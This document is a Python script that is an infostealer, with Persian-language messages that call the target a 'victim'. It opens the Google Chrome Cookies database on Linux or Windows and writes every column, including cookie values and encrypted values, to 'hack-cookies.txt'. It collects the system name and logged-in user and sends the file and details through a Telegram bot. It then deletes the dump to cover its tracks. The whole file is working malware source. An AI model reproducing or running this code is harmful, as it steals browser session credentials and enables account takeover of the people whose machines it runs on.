import sqlite3
import os
from telethon import TelegramClient , events
import asyncio

# @Hidden0612

#-------------------------#
if os.system("uname > /dev/null") == 0 : # Linux
    db_path = os.getenv("HOME") + "/.config/google-chrome/Default/Cookies"
else : # Windows
    appdata = os.getenv("appdata").replace("\\Roaming","")
    db_path = appdata + "\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"

#------------------ Connection Database ------------------#
db = sqlite3.connect(db_path)
c = db.cursor()


# creation_utc
creation_utc = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    creation_utc.append(item[0])

# host_key
host_key = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    host_key.append(item[1])

# name
name = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    name.append(item[2])

# value
value = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    value.append(item[3])

# path
path = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    path.append(item[4])

# expires_utc
expires_utc = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    expires_utc.append(item[5])

# is_secure
is_secure = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    is_secure.append(item[6])

# last_access_utc
last_access_utc = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    last_access_utc.append(item[7])

# is_httponly
is_httponly = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    is_httponly.append(item[8])

# has_expires
has_expires = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    has_expires.append(item[9])

# is_persistent
is_persistent = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    is_persistent.append(item[10])

# priority
priority = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    priority.append(item[11])

# encrypted_value
encrypted_value = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    encrypted_value.append(item[12])

# samesite
samesite = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    samesite.append(item[13])

# source_scheme
source_scheme = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    source_scheme.append(item[14])

# source_port
source_port = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    source_port.append(item[15])

# is_same_party
is_same_party = []
c.execute("SELECT * FROM cookies")
for item in c.fetchall():
    is_same_party.append(item[16])


#---------------- Write IN Text ----------------#
f = open('hack-cookies.txt' , 'a+')

f.write('creation_utc\n')
for c in creation_utc:
    f.write(f'\n{c}')

f.write('\n---------------------------\n')

f.write('host_key :\n')
for h in host_key:    
    f.write(f'\n{h}')

f.write('name :\n')
for n in name:
    f.write(f'\n{n}')

f.write('\n---------------------------\n')

f.write('value :\n')
for v in value:    
    f.write(f'\n{v}')

f.write('\n---------------------------\n') 

f.write('expires_utc :\n')
for e in expires_utc:    
    f.write(f'\n{e}')

f.write('\n---------------------------\n')

f.write('is_secure :\n')
for i in is_secure:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('path :\n')
for p in path:    
    f.write(f'\n{p}')

f.write('\n---------------------------\n')

f.write('last_access_utc :\n')
for l in last_access_utc:    
    f.write(f'\n{l}')

f.write('\n---------------------------\n')

f.write('is_httponly :\n')
for i in is_httponly:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('has_expires :\n')
for h in has_expires:    
    f.write(f'\n{h}')

f.write('\n---------------------------\n')

f.write('is_persistent :\n') 
for i in is_persistent:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('priority :\n')
for i in priority:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('encrypted_value :\n')
for i in encrypted_value:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('samesite :\n')
for s in samesite:    
    f.write(f'\n{s}')

f.write('\n---------------------------\n')

f.write('source_scheme :\n')
for i in source_scheme:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('source_port :\n')
for i in source_port:    
    f.write(f'\n{i}')

f.write('\n---------------------------\n')

f.write('is_same_party :\n')
for i in is_same_party:    
    f.write(f'\n{i}')

f.close()

#---------------- System Information ----------------#

uname = f'''
sysname: {os.uname()[0]}
nodename: {os.uname()[1]}
release: {os.uname()[2]}
version: {os.uname()[3]}
machine: {os.uname()[4]}
'''
user_login = f'{os.getlogin()}'

#---------------- Send File Cookies In Telegram ----------------#

bot = TelegramClient(
    session="name",
    api_id='',
    api_hash="",
    
    ).start(bot_token="")


@bot.on(events.NewMessage)
async def main(event):
    user_id = event.chat_id
    await event.respond('لطفا کمی صبر کنید درحال استخراج اطلاعات :)')
    await event.respond('اطلاعات استخراج شده از فایل کوکی مرورگر قربانی : 👇🏻👇🏻👇🏻')
    await asyncio.sleep(1)
    await bot.send_file(user_id , 'hack-cookies.txt')
    await asyncio.sleep(1)
    await event.respond('اطلاعات استخراج شده از سیستم قربانی : 👇🏻👇🏻👇🏻')
    await event.respond(uname)
    await event.respond(f'یوزر لاگین شده : {user_login}')
    await asyncio.sleep(2)
    await event.respond('درحال پاک کردن درپا :)')
    await asyncio.sleep(2)
    os.remove('hack-cookies.txt')
    await event.respond('فایل استخراج شده کوکی از روی سیستم قربانی پاک شد :)\n موفق باشید :)')

bot.run_until_disconnected()


